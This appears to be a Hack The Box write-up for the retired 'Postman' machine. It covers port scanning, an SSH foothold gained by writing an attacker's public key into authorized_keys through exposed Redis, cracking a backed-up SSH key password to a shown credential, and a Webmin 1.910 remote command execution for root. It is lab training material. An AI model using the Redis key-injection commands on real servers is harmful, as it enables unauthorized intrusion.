## Background

Postman is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let\'s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.160 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-11-03 13:51:36 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 10000/tcp on 10.10.10.160                                 
Discovered open port 6379/tcp on 10.10.10.160                                  
Discovered open port 80/tcp on 10.10.10.160                                    
Discovered open port 22/tcp on 10.10.10.160
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80,6379,10000 -A --reason -oN nmap.txt 10.10.10.160
...
PORT      STATE SERVICE REASON         VERSION

```

Hmm. Other than the usual `ssh` and `http` services, we also have Redis and MiniServ running. Anyhow, this is what the `http` site looks like.

### Redis SSH Backdoor

Anyway since the Redis service is available, let's check and see what we can glean from there.

<a class="image-popup">

</a>

Interesting. The creator seems to be suggesting that there\'s a `redis` SSH account and the way to get a foothold is to dump a SSH public key we control to `authorized_keys`.

That should be easy.

1. `ssh-keygen -f redis`
2. `echo -ne "\n\n" > public; cat redis.pub >> public`
3. `redis-cli -h 10.10.10.160 SLAVEOF NO ONE`
3. `cat public | redis-cli -h 10.10.10.160 -x set pub`
4. `redis-cli -h 10.10.10.160 CONFIG SET dbfilename authorized_keys`
5. `redis-cli -h 10.10.10.160 SAVE`

I've incorporated the above steps into a script to save a bit of time because many HTB players are chasing after a Metasploit exploit that somehow didn't work as expected.

### Matt's Backup SSH Key

During enumeration of `redis`'s account, I noticed that there is another account with UID 1000 (Matt). That would mean that the file `user.txt` is in Matt's home directory.

<a class="image-popup">

</a>

Look what we found!

<a class="image-popup">
![397bd523.png](/assets/images/posts/postman-htb-walkthrough/397bd523.png)
</a>

Matt is careless to leave a backup of his password-protected SSH private key around.

<a class="image-popup">
![52c92cfb.png](/assets/images/posts/postman-htb-walkthrough/52c92cfb.png)
</a>

Something else is up. Notice that Matt cannot login via SSH.

<a class="image-popup">
![cb6018ab.png](/assets/images/posts/postman-htb-walkthrough/cb6018ab.png)
</a>

What good is a password-protected private key if we can't login via SSH? Well, we can crack the key's password and see what it brings us.

<a class="image-popup">
![657cca71.png](/assets/images/posts/postman-htb-walkthrough/657cca71.png)
</a>

And guess what. We can `su` as Matt with that password.

<a class="image-popup">
![b73a8c9e.png](/assets/images/posts/postman-htb-walkthrough/b73a8c9e.png)
</a>

There you have it. The file `user.txt` is indeed in Matt's home directory.

## Privilege Escalation

During enumeration of Matt's account, I noticed the presence of a file in `/etc/webmin/Matt.acl`, which sort of gave me an ideaâ€”maybe Matt is able to log in to the Webmin using the same credential (`Matt:computer2008`)?

No shit.

### Webmin 1.910 - 'Package Updates' Remote Command Execution

Long story short. As much as I wanted to avoid Metasploit, this is one exploit that executes better with it.

This is way too easy.
